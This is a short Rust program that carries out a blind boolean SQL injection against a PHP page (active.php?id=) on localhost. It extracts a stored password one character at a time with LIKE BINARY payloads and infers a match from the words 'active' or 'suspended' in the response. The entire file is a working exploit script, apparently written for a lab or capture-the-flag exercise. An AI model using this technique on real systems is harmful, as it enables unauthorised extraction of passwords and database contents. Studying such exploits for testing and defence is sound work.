use std::io::{self, Write};
use std::time::Instant;

fn main() -> Result<(), Box<dyn std::error::Error>> {
    let now = Instant::now();
    let mut guess = String::new();
    let mut characters = Vec::new();

    for i in 0..8500 {
        characters.push(std::char::from_u32(i).ok_or("Invalid character")?);
    }

    loop {
        let matched_char = characters.iter().find(|character: &&char| -> bool {
            let sql_injection = format!(
                "1 AND password LIKE BINARY '{}|{}%' ESCAPE '|'",
                guess, character
            );
            let url = format!("http:localhost:8080/active.php?id={}", sql_injection);

            let response = reqwest::blocking::get(url).unwrap();
            let text = response.text().unwrap();

            text.contains("active") || text.contains("suspended")
        });

        match matched_char {
            Some(character) => {
                guess.push(*character);

                print!("{}", character);

                io::stdout().flush()?;
            }
            None => {
                println!("\n");
                println!("found {} in {} seconds", guess, now.elapsed().as_secs());

                break;
            }
        }
    }

    Ok(())
}
